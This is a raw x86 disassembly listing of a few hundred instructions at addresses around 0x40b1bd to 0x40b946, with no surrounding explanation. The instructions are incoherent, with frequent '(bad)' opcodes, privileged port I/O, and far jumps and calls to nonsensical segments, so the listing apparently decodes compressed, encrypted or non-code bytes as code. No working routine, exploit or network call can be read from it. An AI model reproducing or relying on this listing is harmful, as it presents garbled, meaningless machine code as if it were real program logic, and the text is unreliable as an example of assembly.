  40b1bd:	cli    
  40b1be:	dec    edi
  40b1bf:	idiv   BYTE PTR [edi+0x3f4638d1]
  40b1c5:	add    bl,BYTE PTR [esi+0x32d45738]
  40b1cb:	mov    cl,0x5f
  40b1cd:	lahf   
  40b1ce:	repnz pop ebx
  40b1d0:	xchg   ebp,eax
  40b1d1:	jp     0x40b1ca
  40b1d3:	adc    DWORD PTR [ebp-0x4d],edx
  40b1d6:	out    dx,eax
  40b1d7:	add    edx,DWORD PTR [ecx]
  40b1d9:	jecxz  0x40b1d5
  40b1db:	or     al,BYTE PTR [ebx+0x60602ff]
  40b1e1:	add    DWORD PTR [edi+0x4d88e561],edi
  40b1e7:	lods   eax,DWORD PTR ds:[esi]
  40b1e8:	mov    eax,ds:0x15423c8a
  40b1ed:	push   ecx
  40b1ee:	cmp    al,0xe0
  40b1f0:	mov    ecx,0x33af01de
  40b1f5:	jno    0x40b210
  40b1f7:	jl     0x40b208
  40b1f9:	icebp  
  40b1fa:	shr    BYTE PTR [eax],1
  40b1fc:	fisttp QWORD PTR ds:[ecx+ebp*8-0x52]
  40b201:	rcl    DWORD PTR [ecx-0x1067a5c6],cl
  40b207:	push   esi
  40b208:	push   edx
  40b209:	test   eax,0x8b1af77
  40b20e:	fucomip st,st(1)
  40b210:	(bad)
  40b214:	(bad)  
  40b215:	in     eax,dx
  40b216:	ja     0x40b22f
  40b218:	enter  0x7f6c,0x3a
  40b21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b21d:	mov    ebp,0xc28d0cd3
  40b222:	xor    BYTE PTR [edx-0x460d3d0b],bl
  40b228:	ins    BYTE PTR es:[edi],dx
  40b229:	xor    BYTE PTR [edi],al
  40b22b:	xchg   DWORD PTR [edi],ecx
  40b22d:	repnz xor ah,BYTE PTR [ebx+0x1b7f13fa]
  40b234:	mov    al,dl
  40b236:	inc    esi
  40b237:	ja     0x40b20c
  40b239:	cmp    edi,DWORD PTR [ebp-0x7bd9a19d]
  40b23f:	xchg   dh,bl
  40b241:	sub    BYTE PTR [edi+0x27dc1426],ch
  40b247:	pop    ecx
  40b248:	xor    edi,DWORD PTR ss:[esi-0x76cef7c4]
  40b24f:	call   0x6b29:0x352f363
  40b256:	and    al,bh
  40b258:	cwde   
  40b259:	fsubp  st(3),st
  40b25b:	out    dx,al
  40b25c:	mov    al,ds:0x908f406c
  40b261:	dec    eax
  40b262:	xor    bh,BYTE PTR [ecx]
  40b264:	arpl   WORD PTR [edi-0x27],bx
  40b267:	(bad)  
  40b268:	or     eax,0xf81a3410
  40b26d:	enter  0x595d,0xa
  40b271:	fs sbb al,0x1c
  40b274:	cld    
  40b275:	push   cs
  40b276:	into   
  40b277:	jle    0x40b222
  40b279:	sbb    DWORD PTR [ecx],edi
  40b27b:	mov    ch,0x3e
  40b27d:	cdq    
  40b27e:	jae    0x40b22a
  40b280:	or     edx,DWORD PTR [eax]
  40b282:	inc    ecx
  40b283:	std    
  40b284:	js     0x40b24b
  40b286:	jmp    0xd1331e95
  40b28b:	adc    eax,0x3b636958
  40b290:	call   0x60c2:0x68d2d75e
  40b297:	or     ebx,DWORD PTR [eax-0x56]
  40b29a:	(bad)  
  40b29c:	fsub   QWORD PTR [ebp+0x96e4cd8]
  40b2a2:	fucom  st(4)
  40b2a4:	out    dx,eax
  40b2a5:	jb     0x40b234
  40b2a7:	cmp    ebx,DWORD PTR [edx+ebx*2-0x2d]
  40b2ab:	pop    ss
  40b2ac:	fimul  WORD PTR [edi-0x43]
  40b2af:	mov    WORD PTR [eax-0x2cea0ead],fs
  40b2b5:	cmp    eax,0x14d5bfa1
  40b2ba:	jg     0x40b256
  40b2bc:	(bad)  
  40b2bd:	or     BYTE PTR [edi+0x5],al
  40b2c0:	(bad)  [edi]
  40b2c2:	pop    ebp
  40b2c3:	repz (bad) 
  40b2c5:	lock and DWORD PTR [esi],0x8d49996f
  40b2cc:	ins    BYTE PTR es:[edi],dx
  40b2cd:	in     al,dx
  40b2ce:	dec    esi
  40b2cf:	ret    
  40b2d0:	aad    0x2
  40b2d2:	gs xor al,0xa1
  40b2d5:	mov    ds:0x3b5c88fc,eax
  40b2da:	ret    
  40b2db:	pushf  
  40b2dc:	mov    ah,0x6b
  40b2de:	ins    DWORD PTR es:[edi],dx
  40b2df:	push   esi
  40b2e0:	ror    esp,0x8d
  40b2e3:	(bad)  
  40b2e4:	dec    esp
  40b2e5:	clc    
  40b2e6:	pusha  
  40b2e7:	mov    edx,0x570a0276
  40b2ec:	shr    BYTE PTR [ebx-0x6c3f3e2f],0x49
  40b2f3:	xor    dl,bl
  40b2f5:	(bad)  
  40b2f7:	enter  0x3559,0x28
  40b2fb:	mov    bh,0x16
  40b2fd:	adc    eax,DWORD PTR [ebx+0x25abcfa4]
  40b303:	xor    BYTE PTR [ebx+0x4b4dbfd],0x79
  40b30a:	out    dx,al
  40b30b:	cmp    DWORD PTR [ecx],edx
  40b30d:	pop    ds
  40b30e:	push   cs
  40b30f:	cwde   
  40b310:	sahf   
  40b311:	and    DWORD PTR [ebx],0x3e
  40b314:	pop    ebp
  40b315:	test   edi,esp
  40b317:	mov    ebp,ebp
  40b319:	mov    dl,BYTE PTR [ecx]
  40b31b:	jne    0x40b366
  40b31d:	push   eax
  40b31e:	nop
  40b31f:	mov    dh,0x5c
  40b321:	push   0xffffff84
  40b323:	cmp    al,0x26
  40b325:	dec    ecx
  40b326:	mov    bl,0xb8
  40b328:	pop    ds
  40b329:	js     0x40b38f
  40b32b:	mov    ebp,0x9e5786a5
  40b330:	fwait
  40b331:	ss mov esp,ebp
  40b334:	jae    0x40b334
  40b336:	test   ecx,ebx
  40b338:	mov    ds:0x29ec0a60,eax
  40b33d:	in     al,dx
  40b33e:	sub    al,0x8e
  40b340:	xchg   edx,eax
  40b341:	jge    0x40b2f1
  40b343:	dec    esi
  40b344:	sbb    al,0x5b
  40b346:	popa   
  40b347:	cwde   
  40b348:	shr    DWORD PTR [ebx+ebp*8],0xb9
  40b34c:	and    ch,dl
  40b34e:	mov    dh,BYTE PTR [edx]
  40b350:	in     al,dx
  40b351:	repnz push edi
  40b353:	jecxz  0x40b32c
  40b355:	popf   
  40b356:	push   cs
  40b357:	and    al,0x7
  40b359:	pushf  
  40b35a:	push   cs
  40b35b:	retf   0x97ba
  40b35e:	cdq    
  40b35f:	cmp    eax,0x4a91579d
  40b364:	fiadd  DWORD PTR [esi-0x7e]
  40b367:	rcr    BYTE PTR [edx-0x40],1
  40b36a:	inc    esi
  40b36b:	adc    eax,0x2c4acbba
  40b370:	inc    ebx
  40b371:	mov    ds:0x9bb27150,eax
  40b376:	lahf   
  40b377:	sub    BYTE PTR [ebx],dl
  40b379:	outs   dx,DWORD PTR ds:[esi]
  40b37a:	loopne 0x40b3f3
  40b37c:	(bad)  
  40b37d:	test   al,0x66
  40b37f:	popa   
  40b380:	mov    ecx,0x48b38053
  40b385:	fcom   st(4)
  40b387:	or     BYTE PTR [esi+0x227c613e],cl
  40b38d:	mov    fs,WORD PTR [ebp-0x6a04aa65]
  40b393:	xor    cl,BYTE PTR [edx]
  40b395:	(bad)  
  40b396:	not    BYTE PTR [eax+0x3f]
  40b399:	pop    edi
  40b39a:	into   
  40b39b:	stc    
  40b39c:	inc    edi
  40b39d:	pusha  
  40b39e:	mov    edx,0xcd92519d
  40b3a3:	cmp    eax,0xbf0f80d8
  40b3a8:	bound  ecx,QWORD PTR [eax]
  40b3aa:	cld    
  40b3ab:	(bad)  
  40b3ac:	xor    al,0xfd
  40b3ae:	dec    ecx
  40b3af:	in     al,dx
  40b3b0:	cmp    al,0x6
  40b3b2:	xchg   DWORD PTR [eax],ecx
  40b3b4:	adc    edi,DWORD PTR [ebp-0x34725d54]
  40b3ba:	push   cs
  40b3bb:	sbb    DWORD PTR [edx],edx
  40b3bd:	sbb    bh,ch
  40b3bf:	das    
  40b3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3c1:	enter  0xd151,0xbb
  40b3c5:	sahf   
  40b3c6:	js     0x40b370
  40b3c8:	mul    DWORD PTR [ebx+0x12]
  40b3cb:	and    ah,BYTE PTR [eax-0x79070433]
  40b3d1:	popf   
  40b3d2:	rep outs dx,DWORD PTR ds:[esi]
  40b3d4:	sahf   
  40b3d5:	stos   BYTE PTR es:[edi],al
  40b3d6:	xchg   edx,eax
  40b3d7:	out    dx,eax
  40b3d8:	adc    ch,BYTE PTR [edx+0x5b6aa7af]
  40b3de:	lds    edi,FWORD PTR [edx]
  40b3e0:	jl     0x40b3fe
  40b3e2:	mov    dl,0x10
  40b3e4:	retf   
  40b3e5:	push   esp
  40b3e6:	aas    
  40b3e7:	xchg   ebx,eax
  40b3e8:	dec    dl
  40b3ea:	dec    ebx
  40b3eb:	pop    ss
  40b3ec:	pop    ebp
  40b3ed:	mov    ch,0xf1
  40b3f0:	cdq    
  40b3f1:	cmp    eax,0xa73ed8f6
  40b3f6:	popf   
  40b3f7:	test   al,0x56
  40b3f9:	jb     0x40b3c7
  40b3fb:	dec    ebx
  40b3fc:	fwait
  40b3fd:	lods   al,BYTE PTR ds:[esi]
  40b3fe:	mul    BYTE PTR [eax+0x68082bf7]
  40b404:	mov    WORD PTR [ebx-0x4d7bd49d],es
  40b40a:	(bad)  
  40b40b:	hlt    
  40b40c:	inc    edi
  40b40d:	int3   
  40b40e:	jo     0x40b3d3
  40b410:	mov    esp,0xd3c42320
  40b415:	(bad)  [esi+0x69]
  40b418:	pop    ebp
  40b419:	dec    ebx
  40b41a:	and    al,0xd
  40b41c:	loopne 0x40b490
  40b41e:	jg     0x40b44d
  40b420:	sub    BYTE PTR [esi+eiz*8+0x2c],dh
  40b424:	lds    edi,FWORD PTR [edx-0xa2c2084]
  40b42a:	or     al,0x5f
  40b42c:	ins    DWORD PTR es:[edi],dx
  40b42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b42e:	pop    es
  40b42f:	cmp    al,bh
  40b431:	cmp    ah,ah
  40b433:	cmp    BYTE PTR [edi+0x2d],0xa0
  40b437:	outs   dx,DWORD PTR ds:[esi]
  40b438:	sub    bh,bh
  40b43a:	outs   dx,BYTE PTR ds:[esi]
  40b43b:	(bad)  
  40b43d:	sbb    al,0xe2
  40b43f:	mov    ch,0xbe
  40b441:	std    
  40b442:	add    DWORD PTR [eax-0x372643f9],ebp
  40b448:	test   eax,0xa44dfdc9
  40b44d:	repnz push ds
  40b44f:	cwde   
  40b450:	in     al,0x1e
  40b452:	outs   dx,BYTE PTR ds:[esi]
  40b453:	xchg   ecx,eax
  40b454:	lea    ecx,[esi+0x9c07284]
  40b45a:	dec    esi
  40b45b:	ss inc ebx
  40b45d:	push   esi
  40b45e:	and    al,0x2a
  40b460:	inc    edi
  40b461:	test   BYTE PTR [ecx],0x23
  40b464:	sbb    ebx,DWORD PTR [eax+0x65]
  40b467:	test   DWORD PTR [edi+0x1a],ecx
  40b46a:	not    DWORD PTR [eax+0x17358c68]
  40b470:	adc    BYTE PTR [ebp-0x1c3717a],bh
  40b476:	lods   al,BYTE PTR ds:[esi]
  40b477:	test   eax,0xe0181537
  40b47c:	and    BYTE PTR [edi],dh
  40b47e:	sbb    eax,0xe0382df4
  40b483:	sbb    BYTE PTR [ebx+eax*4],al
  40b486:	mov    ecx,0x17f9b425
  40b48b:	cmp    al,0xcd
  40b48d:	in     al,0xb9
  40b48f:	jae    0x40b453
  40b491:	add    DWORD PTR [esi],esi
  40b493:	push   0x5
  40b495:	addr16 pop eax
  40b497:	repnz sub dh,BYTE PTR [esi-0x3a]
  40b49b:	mov    bh,0x81
  40b49d:	sbb    al,0x22
  40b49f:	jmp    0xb0fecd9c
  40b4a4:	sub    al,0xbc
  40b4a6:	mov    al,ds:0x54e3fb88
  40b4ab:	mov    dh,BYTE PTR [edx+0x7a43553a]
  40b4b1:	pop    ecx
  40b4b2:	and    eax,0xe1e3e32a
  40b4b7:	mov    BYTE PTR [ebx],dl
  40b4b9:	das    
  40b4ba:	lds    esi,FWORD PTR [edi+ebx*1+0x56]
  40b4be:	mov    ch,cl
  40b4c0:	or     BYTE PTR [ebp-0x65382c6f],cl
  40b4c6:	mov    esp,0x14c4795d
  40b4cb:	sub    esi,DWORD PTR [eax+0x60bb53dd]
  40b4d1:	mov    esp,0xa29bc1ca
  40b4d6:	jnp    0x40b53b
  40b4d8:	cmc    
  40b4d9:	out    0xac,al
  40b4db:	call   0x9e961c96
  40b4e0:	cmp    ebx,DWORD PTR [esp+edx*8-0x51992d5b]
  40b4e7:	push   ebp
  40b4e8:	stos   DWORD PTR es:[edi],eax
  40b4e9:	add    DWORD PTR [ebp-0x53],ecx
  40b4ec:	popa   
  40b4ed:	mov    ch,BYTE PTR [edi+edx*2]
  40b4f0:	outs   dx,DWORD PTR ds:[esi]
  40b4f1:	mov    BYTE PTR [edx+0x26],bh
  40b4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4f5:	pop    esi
  40b4f6:	xor    al,0x5c
  40b4f8:	sbb    al,0xb
  40b4fa:	loop   0x40b4d3
  40b4fc:	sar    BYTE PTR [eax-0x28],1
  40b4ff:	and    eax,0xcc143908
  40b505:	jmp    0x986f:0xc10d3a5b
  40b50c:	push   es
  40b50d:	cmp    BYTE PTR [eax+0xf],0x34
  40b511:	add    eax,0xc539c27e
  40b516:	imul   edx,DWORD PTR [ebx-0xc],0xc23fbf0
  40b51d:	js     0x40b51f
  40b51f:	push   ebp
  40b520:	popaw  
  40b522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b523:	stos   BYTE PTR es:[edi],al
  40b524:	cmp    eax,0x5c6e9f82
  40b529:	xchg   DWORD PTR [eax-0x19],ebp
  40b52c:	mov    esp,0x3b872185
  40b531:	cmp    BYTE PTR [edi+0x48],bl
  40b534:	pop    ds
  40b535:	xchg   ecx,eax
  40b536:	mov    edi,0x15e189e2
  40b53b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b53d:	pusha  
  40b53e:	rol    DWORD PTR [edx+0x6ff8e4fb],cl
  40b544:	mov    bh,0x15
  40b546:	pop    ss
  40b547:	mov    edx,0xb4695981
  40b54c:	daa    
  40b54d:	jg     0x40b4ff
  40b54f:	cmp    DWORD PTR [eax+0x31],esp
  40b552:	loope  0x40b5b5
  40b554:	imul   eax,DWORD PTR [ebx],0x3caf8943
  40b55a:	add    al,0x49
  40b55c:	cmp    edx,DWORD PTR [eax+0x6aec3983]
  40b562:	xor    DWORD PTR [edi-0x1c],edi
  40b565:	pop    esp
  40b566:	mov    BYTE PTR [edi],ah
  40b568:	mov    al,ds:0x5ca4e8da
  40b56d:	jo     0x40b565
  40b56f:	scas   eax,DWORD PTR es:[edi]
  40b570:	cld    
  40b571:	or     bh,BYTE PTR [ecx+0x4104709c]
  40b577:	mov    bh,0x28
  40b579:	push   edx
  40b57a:	mov    dh,0x7c
  40b57c:	mov    ah,0xaa
  40b57e:	repnz hlt 
  40b580:	call   DWORD PTR [ecx]
  40b582:	sbb    BYTE PTR [ecx-0x342ee088],ch
  40b588:	imul   esp,DWORD PTR [ebp+eax*8+0xaf0bb0c],0xf5cb202a
  40b593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b594:	push   es
  40b595:	xchg   esi,eax
  40b597:	adc    dh,BYTE PTR [edx]
  40b599:	mov    cl,0x3
  40b59b:	mov    esi,0x19e23ffb
  40b5a0:	aas    
  40b5a1:	out    0xdc,al
  40b5a3:	cwde   
  40b5a4:	mov    ecx,0x50b4fd41
  40b5a9:	ret    0x583f
  40b5ac:	pop    ebp
  40b5ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ae:	cmp    DWORD PTR [ebx+0x3fae7bba],ebp
  40b5b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b5:	pop    esp
  40b5b6:	mov    ch,0x69
  40b5b8:	ins    BYTE PTR es:[edi],dx
  40b5b9:	xlat   BYTE PTR ds:[ebx]
  40b5ba:	in     al,0xee
  40b5bc:	mov    edi,0x8cc871d5
  40b5c1:	idiv   BYTE PTR [eax+0x33]
  40b5c4:	or     bl,0xc7
  40b5c7:	addr16 mov eax,0x3ee3316d
  40b5cd:	adc    edi,DWORD PTR [edx-0x3a67ce79]
  40b5d3:	test   BYTE PTR [ebp+0x44],dh
  40b5d6:	popa   
  40b5d7:	inc    ebx
  40b5d8:	cmp    edx,DWORD PTR [edi+0xc]
  40b5db:	or     edi,DWORD PTR [ebp+esi*4+0x56169711]
  40b5e2:	push   edx
  40b5e3:	and    al,0x9b
  40b5e5:	loop   0x40b5f3
  40b5e7:	push   ds
  40b5e8:	scas   al,BYTE PTR es:[edi]
  40b5e9:	test   al,0x13
  40b5eb:	outs   dx,BYTE PTR ds:[esi]
  40b5ec:	stc    
  40b5ed:	adc    edx,DWORD PTR [edx-0x773a03e4]
  40b5f3:	push   ecx
  40b5f4:	out    0x56,al
  40b5f6:	mov    al,0xef
  40b5f8:	(bad)  [ecx-0x342951d3]
  40b5fe:	sub    al,0xd6
  40b600:	not    DWORD PTR [esi-0x4e]
  40b603:	(bad)  
  40b604:	nop
  40b605:	cmp    BYTE PTR [edi+edx*1-0x2e],0x71
  40b60a:	rol    ecx,0x3b
  40b60d:	mov    ah,0xa7
  40b60f:	ss xchg ecx,eax
  40b611:	xchg   esp,eax
  40b612:	jle    0x40b5e6
  40b614:	inc    esp
  40b615:	push   ebp
  40b616:	cmp    edi,edi
  40b618:	call   0x6401:0xb5c9d31b
  40b61f:	mov    cl,0x87
  40b621:	(bad)  
  40b622:	das    
  40b623:	aas    
  40b624:	lds    esp,FWORD PTR [eax+0x54e07723]
  40b62a:	inc    esi
  40b62b:	pop    ebx
  40b62c:	mov    bh,ah
  40b62e:	mov    eax,ds:0xe0186a15
  40b633:	mov    edx,0x333fc52
  40b638:	xor    esi,0x35f0d3f8
  40b63e:	cli    
  40b63f:	loopne 0x40b5c6
  40b641:	int3   
  40b642:	sub    eax,0x991f2fe0
  40b647:	nop
  40b648:	push   0xffffff98
  40b64a:	loop   0x40b6c6
  40b64c:	call   FWORD PTR [ecx*8+0x6dc08da2]
  40b653:	arpl   WORD PTR ds:0x64741027,si
  40b659:	xchg   DWORD PTR [edx],edi
  40b65b:	hlt    
  40b65c:	jnp    0x40b63d
  40b65e:	pushf  
  40b65f:	xor    eax,0x835bed1a
  40b664:	and    ah,BYTE PTR [eax+0x270a4775]
  40b66a:	sub    al,0x8b
  40b66c:	(bad)  
  40b66d:	in     al,0x6b
  40b66f:	inc    esi
  40b670:	fwait
  40b671:	in     al,dx
  40b672:	(bad)  
  40b674:	push   eax
  40b675:	fiadd  DWORD PTR [edx]
  40b677:	mov    BYTE PTR [edi+0x1c3b87aa],al
  40b67d:	or     al,0x90
  40b67f:	and    eax,0x6a175962
  40b684:	and    BYTE PTR [ecx],ch
  40b686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b687:	mov    WORD PTR fs:[edx+0x70],cs
  40b68b:	in     eax,dx
  40b68c:	dec    edi
  40b68d:	sbb    bh,BYTE PTR [edx+0x65]
  40b690:	push   ebx
  40b691:	pop    esi
  40b692:	pusha  
  40b693:	loop   0x40b629
  40b695:	sar    BYTE PTR [ebx+ecx*8+0x58be01a9],cl
  40b69c:	stos   BYTE PTR es:[edi],al
  40b69d:	mov    esp,0xb4c3460
  40b6a2:	mov    edx,0xfb25104b
  40b6a7:	jmp    0xb86d8b0a
  40b6ac:	fstp   st(4)
  40b6ae:	aad    0x12
  40b6b0:	mov    ax,0xb0c0
  40b6b4:	mov    ds:0x64aff394,al
  40b6b9:	scas   eax,DWORD PTR es:[edi]
  40b6ba:	jae    0x40b708
  40b6bc:	shr    bh,0x1f
  40b6bf:	pop    es
  40b6c0:	pop    es
  40b6c1:	add    DWORD PTR [edx-0x42],ebx
  40b6c4:	pusha  
  40b6c5:	aam    0x87
  40b6c7:	push   esp
  40b6c8:	mov    ecx,0xb02c751d
  40b6cd:	pop    ebp
  40b6ce:	jle    0x40b6a4
  40b6d0:	cli    
  40b6d1:	leave  
  40b6d2:	cdq    
  40b6d3:	pusha  
  40b6d4:	dec    ebx
  40b6d5:	fcmovnb st,st(5)
  40b6d7:	jnp    0x40b74a
  40b6d9:	dec    ebp
  40b6da:	pushf  
  40b6db:	call   0x8f368026
  40b6e0:	add    BYTE PTR [edx+0xd],bh
  40b6e3:	or     BYTE PTR [ebp-0x41170cfd],0x9f
  40b6ea:	test   DWORD PTR [ecx-0x60],ebp
  40b6ed:	dec    esp
  40b6ee:	lods   eax,DWORD PTR ds:[esi]
  40b6ef:	and    al,BYTE PTR [edx-0x2cebc268]
  40b6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f6:	bndstx [edx-0x75c8ed38],(bad)
  40b6fd:	cwde   
  40b6fe:	add    dh,BYTE PTR [edi]
  40b700:	jl     0x40b6ce
  40b702:	iret   
  40b703:	icebp  
  40b704:	and    BYTE PTR [edx+0x5],al
  40b707:	cld    
  40b708:	popf   
  40b709:	adc    al,0x3c
  40b70b:	hlt    
  40b70c:	sbb    ch,BYTE PTR [ebx+0x1b6977cf]
  40b712:	mov    bl,0x8a
  40b714:	ror    BYTE PTR [eax+0x362b79c6],0x60
  40b71b:	inc    edi
  40b71c:	push   fs
  40b71e:	cld    
  40b71f:	fcom   DWORD PTR [edx-0x44]
  40b722:	xor    ch,dl
  40b724:	std    
  40b725:	enter  0x277,0xa5
  40b729:	out    dx,eax
  40b72a:	in     al,dx
  40b72b:	test   DWORD PTR [edi+edx*2],0xa9107704
  40b732:	push   ds
  40b733:	mov    ah,0x26
  40b735:	adc    al,0xed
  40b737:	mov    eax,0x7bc99119
  40b73c:	fld    QWORD PTR [ebx]
  40b73e:	(bad)  
  40b73f:	loop   0x40b7c0
  40b741:	and    esi,edi
  40b743:	cli    
  40b744:	retf   
  40b745:	daa    
  40b746:	into   
  40b747:	(bad)  
  40b748:	pusha  
  40b749:	mov    esi,0x53c453d2
  40b74e:	enter  0x6476,0x25
  40b752:	mov    DWORD PTR [ebx+0x7f42e851],esp
  40b758:	jecxz  0x40b755
  40b75a:	jno    0x40b7bc
  40b75c:	mov    cl,BYTE PTR [ebx]
  40b75e:	nop
  40b75f:	inc    esi
  40b760:	cmp    eax,0x4dd198c8
  40b765:	test   BYTE PTR [ebx+0x71],0xb9
  40b769:	pop    esi
  40b76a:	call   0xbdc4055e
  40b76f:	repz xor al,0x63
  40b772:	jmp    0xe6ec411b
  40b777:	ret    
  40b778:	jp     0x40b708
  40b77a:	jmp    0x5ad3:0x99ea1975
  40b781:	int    0x73
  40b783:	jmp    0x40b777
  40b785:	xor    ebp,DWORD PTR [esp+edx*4]
  40b788:	jb     0x40b803
  40b78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b78b:	jp     0x40b777
  40b78d:	mov    DWORD PTR [esi+0x708d8edf],eax
  40b793:	stc    
  40b794:	xchg   ebp,eax
  40b795:	jno    0x40b7fe
  40b797:	test   eax,0xc281722a
  40b79c:	jnp    0x40b7d9
  40b79e:	and    DWORD PTR [ebx+0x2b],0x4b
  40b7a2:	dec    ebp
  40b7a3:	push   esp
  40b7a4:	xchg   edi,eax
  40b7a5:	pop    edi
  40b7a6:	out    0xaa,eax
  40b7a8:	mov    fs,WORD PTR [edx+0x33]
  40b7ab:	hlt    
  40b7ac:	xchg   edi,eax
  40b7ad:	jle    0x40b752
  40b7af:	lahf   
  40b7b0:	cmp    al,0xd7
  40b7b2:	jmp    0xdf728bc9
  40b7b7:	adc    DWORD PTR [ecx],edx
  40b7b9:	dec    ebx
  40b7ba:	fldenv [esi-0x72]
  40b7bd:	xlat   BYTE PTR ds:[ebx]
  40b7be:	test   ch,0xe7
  40b7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c2:	loop   0x40b7e5
  40b7c4:	jo     0x40b805
  40b7c6:	in     al,dx
  40b7c7:	or     BYTE PTR ds:0xe58f7e4f,ah
  40b7cd:	loopne 0x40b77f
  40b7cf:	dec    ebp
  40b7d0:	nop
  40b7d1:	stos   BYTE PTR es:[edi],al
  40b7d2:	jmp    0xf615:0xcd0f3ccb
  40b7d9:	or     ch,BYTE PTR [ebp-0x7402dda1]
  40b7df:	stos   BYTE PTR es:[edi],al
  40b7e0:	push   ss
  40b7e1:	fbstp  TBYTE PTR [esi-0x78]
  40b7e4:	mov    edx,0x8704dee2
  40b7e9:	imul   ebx,esp,0x9cb9514e
  40b7ef:	pop    esi
  40b7f0:	push   edi
  40b7f1:	mov    al,ds:0x807093e8
  40b7f6:	mov    ah,0x49
  40b7f8:	nop
  40b7f9:	or     bl,BYTE PTR [edx+0x6d2d32cf]
  40b7ff:	inc    edi
  40b800:	sbb    eax,DWORD PTR [edx-0x23]
  40b803:	or     eax,0x930bad56
  40b808:	sbb    esp,DWORD PTR [ecx-0x762b8f9c]
  40b80e:	mov    dh,0x7c
  40b810:	mov    edi,0x44565f4e
  40b815:	cs dec edx
  40b817:	jns    0x40b7df
  40b819:	loope  0x40b84b
  40b81b:	imul   edx
  40b81d:	aam    0x51
  40b81f:	inc    eax
  40b820:	fnsave [ebx+edx*2]
  40b823:	xlat   BYTE PTR ds:[ebx]
  40b824:	jmp    0xfce6:0x862e674d
  40b82b:	lods   eax,DWORD PTR ds:[esi]
  40b82c:	dec    edx
  40b82d:	mov    bh,BYTE PTR [esi]
  40b82f:	push   ss
  40b830:	out    0xea,al
  40b832:	inc    esp
  40b833:	inc    edi
  40b834:	jbe    0x40b875
  40b836:	leave  
  40b837:	inc    edx
  40b838:	mov    esi,0xf4ad7de2
  40b83d:	sbb    BYTE PTR [edx-0xe],dh
  40b840:	in     eax,0x61
  40b842:	cmp    al,0x6a
  40b844:	dec    esp
  40b845:	mov    bl,0x3d
  40b847:	jle    0x40b823
  40b849:	sti    
  40b84a:	sbb    al,0x93
  40b84c:	mov    esi,0xd23e3749
  40b851:	jbe    0x40b88d
  40b853:	pop    edi
  40b854:	jae    0x40b80c
  40b856:	inc    edi
  40b857:	xor    eax,0x844a8ae6
  40b85c:	adc    eax,0x47f2caed
  40b861:	stos   BYTE PTR es:[edi],al
  40b862:	xchg   esp,eax
  40b863:	jle    0x40b8d5
  40b865:	sbb    eax,0xf31b230c
  40b86a:	mov    ebx,0xcea9b1ef
  40b86f:	dec    esp
  40b870:	aas    
  40b871:	jmp    0x3c32:0x85b3fbb6
  40b878:	dec    esp
  40b879:	mov    esp,0x48f608f
  40b87e:	inc    edx
  40b87f:	xchg   DWORD PTR [ebx],eax
  40b881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b882:	xchg   ecx,eax
  40b883:	stos   DWORD PTR es:[edi],eax
  40b884:	lea    esi,ds:0xd446d9ba
  40b88a:	mov    bh,0xf3
  40b88c:	cmp    al,0xe8
  40b88e:	dec    eax
  40b88f:	bound  edx,QWORD PTR [edi]
  40b891:	or     ch,0xff
  40b894:	or     BYTE PTR [edi+0x40],0x70
  40b898:	inc    edx
  40b899:	ror    DWORD PTR [ebx+edx*2-0x5d],cl
  40b89d:	add    bh,ch
  40b89f:	cdq    
  40b8a0:	in     al,0x1d
  40b8a2:	stos   DWORD PTR es:[edi],eax
  40b8a3:	mov    bh,BYTE PTR [edx]
  40b8a5:	mov    gs,ebp
  40b8a7:	es ret 0xfc35
  40b8ab:	call   0x2d29:0x3c1ffb19
  40b8b2:	jge    0x40b892
  40b8b4:	cmp    ch,BYTE PTR [ebx-0x6be2a3d9]
  40b8ba:	or     eax,0x4b49a08a
  40b8bf:	dec    esp
  40b8c0:	js     0x40b88e
  40b8c2:	dec    edx
  40b8c3:	or     ah,BYTE PTR [ecx+0x13]
  40b8c6:	imul   ecx,ebp,0x6a
  40b8c9:	xchg   ebp,eax
  40b8ca:	and    eax,0xb11d167c
  40b8cf:	add    BYTE PTR [esp+eax*8],dh
  40b8d2:	ins    DWORD PTR es:[edi],dx
  40b8d3:	pop    eax
  40b8d4:	sub    al,0x47
  40b8d6:	cs pop ss
  40b8d8:	lods   al,BYTE PTR ds:[esi]
  40b8d9:	jbe    0x40b942
  40b8db:	rcr    edx,cl
  40b8dd:	sub    al,0x11
  40b8df:	dec    esi
  40b8e0:	(bad)  [ecx+0x70f9a29e]
  40b8e6:	fst    QWORD PTR [ebx]
  40b8e8:	enter  0x5e83,0xb6
  40b8ec:	dec    ebx
  40b8ed:	xor    BYTE PTR [edi+0x6bee9995],bh
  40b8f3:	pop    eax
  40b8f4:	fdecstp 
  40b8f6:	add    DWORD PTR [ebp+0x77],eax
  40b8f9:	int3   
  40b8fa:	jp     0x40b8ba
  40b8fc:	fcom   DWORD PTR [esi+0x21b397a8]
  40b902:	mov    esi,0xb52d539
  40b907:	hlt    
  40b908:	ja     0x40b96e
  40b90a:	adc    DWORD PTR [ebp-0x5c],0xffffff93
  40b90e:	dec    bp
  40b910:	sbb    eax,0xd6034d2b
  40b915:	lea    esp,[edi]
  40b917:	es (bad) 
  40b919:	call   0x346a18
  40b91e:	ss xchg esp,esp
  40b921:	aas    
  40b922:	pop    edi
  40b923:	leave  
  40b924:	pop    ebp
  40b925:	adc    BYTE PTR [ecx],al
  40b927:	sbb    edi,DWORD PTR [esi-0x57]
  40b92a:	(bad)  
  40b92b:	lahf   
  40b92c:	sub    BYTE PTR [esi+0x75443da2],ah
  40b932:	fistp  DWORD PTR [ebp-0x6d]
  40b935:	or     eax,0x829ed098
  40b93a:	jae    0x40b8fa
  40b93c:	adc    edx,DWORD PTR [ecx]
  40b93e:	(bad)  [edx-0x46]
  40b941:	mov    ds:0xb58384f9,eax
  40b946:	cli    
